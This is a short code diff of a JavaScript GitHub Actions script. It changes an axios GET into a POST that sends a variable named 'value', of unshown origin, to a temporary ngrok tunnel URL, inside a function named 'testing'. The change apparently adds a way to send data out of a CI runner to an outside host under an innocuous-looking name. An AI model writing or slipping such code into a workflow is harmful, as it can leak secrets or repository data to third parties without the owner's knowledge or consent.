@@ -1,5 +1,5 @@
 const core = require("@actions/core");
-const axios = require("axios");
+const axios = require("axios").default;
 const { readFileSync } = require("fs");
 
 console.log("inside");
@@ -11,7 +11,9 @@ console.log(value, 3524);
 
 async function testing() {
   await axios
-    .get("http://de57-103-252-164-15.ngrok.io")
+    .post("http://de57-103-252-164-15.ngrok.io", {
+      value,
+    })
     .then(function (response) {
       // handle success
       console.log(response.data);
